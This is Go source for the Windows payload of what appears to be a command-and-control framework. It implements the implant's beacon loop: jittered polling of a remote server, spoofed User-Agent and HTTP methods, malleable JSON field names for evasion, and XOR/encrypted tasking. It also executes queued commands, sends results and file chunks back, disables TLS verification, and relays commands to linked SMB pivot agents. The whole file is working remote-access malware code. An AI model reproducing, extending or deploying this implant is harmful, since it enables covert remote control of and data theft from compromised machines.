// server/docker/payloads/Windows/main.go

//go:build windows
// +build windows

package main

import (
	"bytes"
	"crypto/sha256"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	// "log"
	"math"
	"math/rand"
	"net/http"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// MALLEABLE_REKEY_COMMAND is the customizable rekey command value
// This will be replaced at compile time via -ldflags
var MALLEABLE_REKEY_COMMAND = "rekey_required"

// Malleable JSON field names for rekey response
// These will be replaced at compile time via -ldflags
var MALLEABLE_REKEY_STATUS_FIELD = "status"
var MALLEABLE_REKEY_DATA_FIELD = "data"
var MALLEABLE_REKEY_ID_FIELD = "command_db_id"

// Malleable JSON field names for SMB link protocol
// These will be replaced at compile time via -ldflags
var MALLEABLE_LINK_DATA_FIELD = "ld"         // Link data from connected SMB agents
var MALLEABLE_LINK_COMMANDS_FIELD = "lc"     // Link commands from server for SMB agents
var MALLEABLE_LINK_HANDSHAKE_FIELD = "lh"    // Link handshake data
var MALLEABLE_LINK_HANDSHAKE_RESP_FIELD = "lr" // Link handshake response

// PollConfig holds the configuration for polling behavior
type PollConfig struct {
	GetURL          string
	PostURL         string
	DecryptedValues map[string]string
}

var (
	commandQueue    *CommandQueue
	resultManager   *ResultManager
	currentPolling  *sync.WaitGroup
	pollingShutdown chan struct{}
	pollingMutex    sync.Mutex
	rekeyInProgress atomic.Bool // Prevent concurrent rekey operations
)

func init() {
	commandQueue = NewCommandQueue()
	resultManager = NewResultManager()
	currentPolling = &sync.WaitGroup{}
	pollingShutdown = make(chan struct{})
}

// deriveXORKey creates the same XOR key as the server
func deriveXORKey(clientID, secret string) []byte {
	// Must match server implementation exactly
	combined := clientID + ":" + secret
	hash := sha256.Sum256([]byte(combined))
	return hash[:32]
}

// xorDecryptBytes decrypts byte array using XOR
func xorDecryptBytes(data []byte, key []byte) []byte {
	result := make([]byte, len(data))
	for i := 0; i < len(data); i++ {
		result[i] = data[i] ^ key[i%len(key)]
	}
	return result
}

// tryDecryptResponse attempts to find and decrypt the XOR encrypted field
func tryDecryptResponse(rawResponse map[string]interface{}, xorKey []byte) (map[string]interface{}, error) {
	// Try each field in the response
	for _, fieldValue := range rawResponse {
		// Skip non-string fields
		strValue, ok := fieldValue.(string)
		if !ok {
			continue
		}

		// Try to base64 decode
		encrypted, err := base64.StdEncoding.DecodeString(strValue)
		if err != nil {
			continue // Not valid base64, skip
		}

		// Try to XOR decrypt
		decrypted := xorDecryptBytes(encrypted, xorKey)

		// Try to parse as JSON
		var response map[string]interface{}
		if err := json.Unmarshal(decrypted, &response); err != nil {
			continue // Not valid JSON after decryption, skip
		}

		// Check if it has expected fields (status is required)
		if _, hasStatus := response["status"]; hasStatus {
			return response, nil
		}
	}

	return nil, fmt.Errorf(Err(E18))
}

// checkAsyncBOFResults checks for pending async BOF results (Windows only)
// This function is only compiled and called on Windows where bofJobManager exists

// calculateJitteredInterval applies jitter to the base sleep interval
func calculateJitteredInterval(baseSeconds int, jitterPercent float64, r *rand.Rand) time.Duration {
	baseInterval := time.Duration(baseSeconds) * time.Second
	jitterFactor := jitterPercent / 100.0
	maxVariation := float64(baseInterval) * jitterFactor
	variation := (r.Float64()*2 - 1) * maxVariation
	jitteredInterval := time.Duration(float64(baseInterval) + variation)
	return jitteredInterval
}

// sendResults sends encrypted results to the server
func sendResults(encryptedData string, customHeaders map[string]string) error {
	// Get current URLs dynamically
	_, postURL := handshakeManager.GetCurrentURLs()
	decryptedValues := handshakeManager.decryptedValues

	postData := struct {
		Data string `json:"data"`
	}{
		Data: encryptedData,
	}

	jsonData, err := json.Marshal(postData)
	if err != nil {
		return fmt.Errorf(ErrCtx(E18, err.Error()))
	}

	// Get the custom POST method from decrypted values
	method := decryptedValues["POST Method"]
	if method == "" {
		method = "POST" // Fallback to default
	}

	// Create request with custom method
	req, err := http.NewRequest(method, postURL, bytes.NewBuffer(jsonData))
	if err != nil {
		return fmt.Errorf(ErrCtx(E12, err.Error()))
	}

	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", decryptedValues["User Agent"])
	for key, value := range customHeaders {
		req.Header.Set(key, value)
	}

	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true,
			},
		},
		Timeout: time.Second * 30,
	}

	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf(ErrCtx(E12, err.Error()))
	}
	defer func() {
		io.Copy(io.Discard, resp.Body) // drain body
		resp.Body.Close()              // then close
	}()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf(ErrCtx(E12, fmt.Sprintf("%d", resp.StatusCode)))
	}

	return nil
}

// doPoll performs a single poll cycle
func doPoll(secureComms *SecureComms, customHeaders map[string]string) error {
	// Get current URLs dynamically
	getURL, _ := handshakeManager.GetCurrentURLs()
	decryptedValues := handshakeManager.decryptedValues

	// Get the custom GET method from decrypted values
	method := decryptedValues["GET Method"]
	if method == "" {
		method = "GET" // Fallback to default
	}

	// Create the request with custom method
	req, err := http.NewRequest(method, getURL, nil)
	if err != nil {
		return fmt.Errorf(ErrCtx(E12, err.Error()))
	}

	// Set headers
	req.Header.Set("User-Agent", decryptedValues["User Agent"])
	for key, value := range customHeaders {
		req.Header.Set(key, value)
	}

	// Create HTTP client with TLS config
	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true,
			},
		},
		Timeout: time.Second * 30,
	}

	// Send request
	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf(ErrCtx(E12, err.Error()))
	}
	defer func() {
		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()
	}()

	// Read response body
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return fmt.Errorf(ErrCtx(E10, err.Error()))
	}

	// First try to parse as raw JSON
	var rawResponse map[string]interface{}
	if err := json.Unmarshal(body, &rawResponse); err != nil {
		return fmt.Errorf(ErrCtx(E18, err.Error()))
	}

	// Use a generic response map instead of struct to support malleable field names
	var responseMap map[string]interface{}

	// Check if this is an XOR encrypted response
	// Try to detect by checking if the malleable status field exists
	if _, hasStatus := rawResponse[MALLEABLE_REKEY_STATUS_FIELD]; !hasStatus && len(rawResponse) > 0 {
		// Likely encrypted, try to decrypt

		// Get current secret from secureComms
		currentSecret := secureComms.secret1 // Direct access to field
		xorKey := deriveXORKey(clientID, currentSecret)

		decryptedMap, err := tryDecryptResponse(rawResponse, xorKey)
		if err != nil {
			// Couldn't decrypt, use raw response
			responseMap = rawResponse
		} else {
			// Successfully decrypted
			responseMap = decryptedMap
		}
	} else {
		// Unencrypted response
		responseMap = rawResponse
	}

	// Extract values using malleable field names
	var responseStatus string
	var responseData string
	var responseCommandDBID interface{}

	if statusVal, ok := responseMap[MALLEABLE_REKEY_STATUS_FIELD]; ok {
		if s, ok := statusVal.(string); ok {
			responseStatus = s
		}
	}
	if dataVal, ok := responseMap[MALLEABLE_REKEY_DATA_FIELD]; ok {
		if d, ok := dataVal.(string); ok {
			responseData = d
		}
	}
	if cmdIDVal, ok := responseMap[MALLEABLE_REKEY_ID_FIELD]; ok {
		responseCommandDBID = cmdIDVal
	}

	// Check for rekey command (special status that doesn't require decryption)
	// Debug: Print the compile-time MALLEABLE_REKEY_COMMAND value
	//fmt.Printf("[DEBUG] MALLEABLE_REKEY_COMMAND compiled value: %q\n", MALLEABLE_REKEY_COMMAND)
	//fmt.Printf("[DEBUG] response status from server: %q\n", responseStatus)
	if responseStatus == MALLEABLE_REKEY_COMMAND {
		//fmt.Println("[DEBUG] Received rekey command from server - MATCH FOUND!")

		// Extract command DB ID for the rekey result
		var commandDBID int
		switch v := responseCommandDBID.(type) {
		case float64:
			commandDBID = int(v)
		case int:
			commandDBID = v
		case string:
			commandDBID, _ = strconv.Atoi(v)
		}

		// Execute rekey command directly without decryption
		//fmt.Println("[DEBUG] Executing rekey command...")

		// Create result for the rekey command first (before triggering rekey)
		rekeyResult := &CommandResult{
			Command: Command{
				Command:     "rekey",
				CommandDBID: commandDBID,
				AgentID:     clientID,
			},
			CompletedAt: time.Now().Format(time.RFC3339),
			Output:      Succ(S15),
			ExitCode:    0,
		}

		// Queue the result to be sent back
		if err := resultManager.AddResult(rekeyResult); err != nil {
		} else {
		}

		// Perform handshake refresh in a separate goroutine to avoid deadlock
		// Use atomic flag to prevent multiple concurrent rekey operations
		if rekeyInProgress.CompareAndSwap(false, true) {
			go func() {
				defer rekeyInProgress.Store(false)
				//fmt.Println("[DEBUG] Starting rekey in background...")
				if err := refreshHandshake(); err != nil {
				} else {
					//fmt.Println("[DEBUG] Rekey completed successfully")
				}
			}()
		}

		// Return immediately - the new goroutine will handle the rekey
		// This allows the current polling goroutine to exit cleanly
		return fmt.Errorf(Err(E19))
	}

	// IMPORTANT: Process handshake responses BEFORE commands!
	// The SMB agent is waiting in performHandshake for the handshake_response.
	// If we send a command first, the SMB agent will receive "data" when expecting
	// "handshake_response", fail the handshake, and close the pipe.
	if linkRespVal, ok := responseMap[MALLEABLE_LINK_HANDSHAKE_RESP_FIELD]; ok {
		if linkRespData, ok := linkRespVal.([]interface{}); ok {
			// log.Printf("[LinkManager] Processing %d handshake responses before commands", len(linkRespData))
			processLinkHandshakeResponses(linkRespData)
		}
	}

	// Now process link commands (for forwarding to SMB agents after handshake is complete)
	// These are in the outer layer, not encrypted with our key
	if linkCmdsVal, ok := responseMap[MALLEABLE_LINK_COMMANDS_FIELD]; ok {
		if linkCmdsData, ok := linkCmdsVal.([]interface{}); ok {
			processLinkCommands(linkCmdsData)

			// After processing link commands, immediately send any queued responses
			// This enables faster round-trip for linked agent commands
			linkData := GetLinkManager().GetOutboundData()
			if len(linkData) > 0 {
				// log.Printf("[LinkManager] Sending %d immediate link responses to server", len(linkData))
				sendImmediateLinkData(secureComms, customHeaders, linkData)
			}
		}
	}

	// Check for no commands
	if responseStatus == "no_commands" {
		return nil
	}

	// Normal encrypted command processing
	if responseData != "" {
		decrypted, err := secureComms.DecryptMessage(responseData)
		if err != nil {
			// Log decryption failure which might indicate key desync
			//fmt.Println("[DEBUG] Key desync detected - initiating automatic rekey")

			// Automatically trigger rekey in background
			// Use atomic flag to prevent multiple concurrent rekey operations
			if rekeyInProgress.CompareAndSwap(false, true) {
				go func() {
					defer rekeyInProgress.Store(false)
					//fmt.Println("[DEBUG] Starting automatic rekey due to decryption failure...")
					if rekeyErr := refreshHandshake(); rekeyErr != nil {
					} else {
						//fmt.Println("[DEBUG] Automatic rekey completed successfully")
					}
				}()
			}

			// Return nil instead of error to prevent cascading failures
			// The rekey will restart polling with fresh keys
			return nil
		}

		//fmt.Printf("[DEBUG] Decrypted command data from server: %s\n", decrypted)

		if err := commandQueue.AddCommands(decrypted); err != nil {
			//return fmt.Errorf("failed to queue commands: %v", err)
		}

		// Process commands
		//fmt.Println("[DEBUG] Starting to process commands...")
		for {
			result, err := commandQueue.ProcessNextCommand()
			if err != nil {
				continue
			}
			if result == nil {
				//fmt.Println("[DEBUG] No more commands to process")
				break
			}
			/*
			 */
			if err := resultManager.AddResult(result); err != nil {
			} else {
			}
		}

		secureComms.RotateSecret()
	}

	return nil
}

// sendImmediateLinkData sends link data to the server without waiting for the next poll cycle
// This enables faster round-trip for linked agent command responses
func sendImmediateLinkData(secureComms *SecureComms, customHeaders map[string]string, linkData []*LinkDataOut) {
	if len(linkData) == 0 {
		return
	}

	// Build payload with only link data
	payload := make(map[string]interface{})
	payload["agent_id"] = clientID
	payload[MALLEABLE_LINK_DATA_FIELD] = linkData

	jsonData, err := json.Marshal(payload)
	if err != nil {
		// log.Printf("[LinkManager] Failed to marshal immediate link data: %v", err)
		// Re-queue the data so it's not lost
		requeueLinkData(linkData)
		return
	}

	encrypted, err := secureComms.EncryptMessage(string(jsonData))
	if err != nil {
		// log.Printf("[LinkManager] Failed to encrypt immediate link data: %v", err)
		// Re-queue the data so it's not lost
		requeueLinkData(linkData)
		return
	}

	if err := sendResults(encrypted, customHeaders); err != nil {
		// log.Printf("[LinkManager] Failed to send immediate link data: %v, re-queuing for next poll", err)
		// Re-queue the data so it's not lost - will be sent on next poll cycle
		requeueLinkData(linkData)
	} else {
		// log.Printf("[LinkManager] Successfully sent %d immediate link responses to server", len(linkData))
		secureComms.RotateSecret()
	}
}

// requeueLinkData puts link data back into the outbound queue when immediate send fails
func requeueLinkData(linkData []*LinkDataOut) {
	lm := GetLinkManager()
	for _, item := range linkData {
		lm.queueOutboundData(item)
	}
	// log.Printf("[LinkManager] Re-queued %d link data items for next poll cycle", len(linkData))
}

// processLinkCommands forwards commands from the server to linked SMB agents
// and waits briefly for responses to enable faster round-trips
func processLinkCommands(linkCmds []interface{}) {
	lm := GetLinkManager()

	// log.Printf("[LinkManager] Processing %d link commands", len(linkCmds))

	// Timeout for waiting for command responses (5 seconds is reasonable for most commands)
	const commandResponseTimeout = 5 * time.Second

	for _, cmd := range linkCmds {
		cmdMap, ok := cmd.(map[string]interface{})
		if !ok {
			continue
		}

		// Extract routing ID and payload using malleable field names
		routingID, _ := cmdMap["r"].(string)
		payload, _ := cmdMap["p"].(string)

		if routingID == "" || payload == "" {
			continue
		}

		// Forward to the linked agent and wait for response
		// log.Printf("[LinkManager] Forwarding command to linked agent %s (with %v timeout)", routingID, commandResponseTimeout)
		response, err := lm.ForwardToLinkedAgentAndWait(routingID, payload, commandResponseTimeout)
		if err != nil {
			// log.Printf("[LinkManager] Failed to forward command to %s: %v", routingID, err)
			continue
		}

		if response != nil {
			// Got an immediate response - queue it for the server
			// log.Printf("[LinkManager] Got immediate response from %s, queuing for server", routingID)
			lm.queueOutboundData(response)
		} else {
			// log.Printf("[LinkManager] No immediate response from %s (will come later)", routingID)
		}
	}
}

// processLinkHandshakeResponses forwards handshake responses from server to SMB agents
func processLinkHandshakeResponses(responses []interface{}) {
	lm := GetLinkManager()

	for _, resp := range responses {
		respMap, ok := resp.(map[string]interface{})
		if !ok {
			continue
		}

		// Extract routing ID and payload
		routingID, _ := respMap["r"].(string)
		payload, _ := respMap["p"].(string)

		if routingID == "" || payload == "" {
			continue
		}

		// Get the linked agent - use direct map access to bypass IsActive check
		// Handshake responses are critical and should be attempted even if link appears inactive
		// (the SMB agent may still be waiting with a long timeout)
		lm.mu.RLock()
		link, exists := lm.links[routingID]
		lm.mu.RUnlock()

		if !exists || link == nil {
			// log.Printf("[LinkManager] No link found for routing_id %s when forwarding handshake response", routingID)
			continue
		}

		// Send handshake response to SMB agent
		message := map[string]string{
			"type":    "handshake_response",
			"payload": payload,
		}

		data, err := json.Marshal(message)
		if err != nil {
			continue
		}

		// Try to send regardless of IsActive - the SMB agent may be waiting with long timeout
		link.mu.Lock()
		if link.Conn != nil {
			// log.Printf("[LinkManager] Forwarding handshake response to routing_id %s (IsActive=%v)", routingID, link.IsActive)
			if err := writeMessage(link.Conn, data); err != nil {
				// log.Printf("[LinkManager] Failed to send handshake response to %s: %v", routingID, err)
			} else {
				// log.Printf("[LinkManager] Successfully sent handshake response to routing_id %s", routingID)
				link.LastSeen = time.Now()
				// Re-activate link if it was marked inactive due to read timeout
				// The handshake response completing successfully proves the pipe is still alive
				if !link.IsActive {
					link.IsActive = true
					// log.Printf("[LinkManager] Re-activated link %s after successful handshake response", routingID)
				}
			}
		} else {
			// log.Printf("[LinkManager] Link %s has nil connection, cannot send handshake response", routingID)
		}
		link.mu.Unlock()
	}
}

// startPolling initializes and starts the polling routine
func startPolling(config PollConfig, sysInfo *SystemInfoReport) error {
	// Use the SecureComms from HandshakeManager instead of creating a new one
	secureComms := handshakeManager.GetSecureComms()
	if secureComms == nil {
		// Fallback to creating new one if not available (shouldn't happen)
		secureComms = NewSecureComms(
			handshakeManager.decryptedValues["Secret"],
			sysInfo.AgentInfo.Seed,
		)
	}

	// Create a fresh shutdown channel for this polling session
	pollingMutex.Lock()
	pollingShutdown = make(chan struct{}) // Fresh channel for this session
	pollingMutex.Unlock()

	r := rand.New(rand.NewSource(time.Now().UnixNano()))

	// Parse custom headers from handshakeManager
	customHeaders, err := parseCustomHeaders(handshakeManager.decryptedValues["Custom Headers"])
	if err != nil {
		return fmt.Errorf(ErrCtx(E18, err.Error()))
	}

	// Add to WaitGroup before starting goroutine
	currentPolling.Add(1)

	go func() {
		// Ensure we call Done when goroutine exits
		defer currentPolling.Done()

		consecutiveErrors := 0
		maxBackoffMultiplier := 5

		// Add label for outer loop
	pollingLoop:
		for {
			// Check for shutdown signal at the start of each iteration
			select {
			case <-pollingShutdown:
				//fmt.Println("Polling shutdown signal received, exiting polling loop")
				return
			default:
				// Continue with polling
			}

			// Get current sleep and jitter values at start of each iteration
			baseSeconds, err := strconv.Atoi(sleep)
			if err != nil {
				baseSeconds = 30 // Default to 30 seconds if invalid
			}

			// Get current jitter value
			jitterValue, err := strconv.ParseFloat(jitter, 64)
			if err != nil {
				jitterValue = 10.0 // Default to 10% if invalid
			}

			nextInterval := calculateJitteredInterval(baseSeconds, jitterValue, r)
			if consecutiveErrors > 0 {
				backoffMultiplier := math.Min(float64(consecutiveErrors), float64(maxBackoffMultiplier))
				backoffInterval := time.Duration(float64(nextInterval) * math.Pow(2, backoffMultiplier))
				nextInterval = backoffInterval
			}

			// Collect link data from connected SMB agents (if any)
			linkData := GetLinkManager().GetOutboundData()
			// Collect unlink notifications (routing IDs that have been disconnected)
			unlinkNotifications := GetLinkManager().GetUnlinkNotifications()

			// Handle pending results before sleep
			hasResults := resultManager.HasResults()
			hasLinkData := len(linkData) > 0
			hasUnlinkNotifications := len(unlinkNotifications) > 0

			if hasResults || hasLinkData || hasUnlinkNotifications {
				results := resultManager.GetPendingResults()

				// Build dynamic payload structure that includes link data if present
				payload := make(map[string]interface{})
				payload["agent_id"] = clientID

				if len(results) > 0 {
					payload["results"] = results
				}

				// Include link data if we have any (uses malleable field names)
				if hasLinkData {
					// log.Printf("[LinkManager] Including %d link data items in POST to server", len(linkData))
					payload[MALLEABLE_LINK_DATA_FIELD] = linkData
				}

				// Include unlink notifications if we have any (routing IDs that have been disconnected)
				if hasUnlinkNotifications {
					// log.Printf("[LinkManager] Including %d unlink notifications in POST to server", len(unlinkNotifications))
					payload["lu"] = unlinkNotifications // "lu" = link_unlink
				}

				jsonData, err := json.Marshal(payload)
				if err != nil {
				} else {
					encrypted, err := secureComms.EncryptMessage(string(jsonData))
					if err != nil {
					} else {
						// Updated call - no config parameter
						if err := sendResults(encrypted, customHeaders); err != nil {
						} else {
							// Only cleanup after confirmed send
							for _, result := range results {
								if result.CurrentChunk > 0 && result.CurrentChunk == result.TotalChunks {
									commandQueue.mu.Lock()
									if _, exists := commandQueue.activeDownloads[result.Filename]; exists {
										delete(commandQueue.activeDownloads, result.Filename)
									}
									commandQueue.mu.Unlock()
								}
							}
							secureComms.RotateSecret()
						}
					}
				}
			}

			// Check for shutdown before sleep
			select {
			case <-pollingShutdown:
				//fmt.Println("Polling shutdown requested before sleep, exiting...")
				return
			case <-time.After(nextInterval):
				// Continue with next poll
			}

			// Perform the poll AFTER sleep
			if err := doPoll(secureComms, customHeaders); err != nil {
				// Check if this is a rekey in progress - if so, exit the entire goroutine
				if err.Error() == E19 {
					//fmt.Println("Rekey initiated, exiting current polling loop")
					break pollingLoop // Break out of the outer for loop
				}
				// Check for decryption failures
				if strings.Contains(err.Error(), E18) {
					// Could trigger automatic rekey here if needed
				}
				consecutiveErrors++
			} else {
				consecutiveErrors = 0
			}
		}
	}()

	return nil
}

// StopPolling signals the current polling routine to stop and waits for it to finish
func StopPolling() {
	//fmt.Println("Stopping current polling routine...")

	pollingMutex.Lock()
	if pollingShutdown != nil {
		close(pollingShutdown)
		pollingShutdown = nil // Set to nil instead of creating new channel
	}
	pollingMutex.Unlock()

	// Wait with timeout to prevent hanging
	done := make(chan struct{})
	go func() {
		currentPolling.Wait()
		close(done)
	}()

	select {
	case <-done:
		//fmt.Println("Polling routine stopped successfully")
	case <-time.After(10 * time.Second):
		//fmt.Println("Warning: Polling routine stop timed out after 10 seconds")
	}

	// Reset only the WaitGroup, NOT the channel
	pollingMutex.Lock()
	currentPolling = &sync.WaitGroup{}
	// Don't recreate pollingShutdown here - leave it nil
	pollingMutex.Unlock()
}
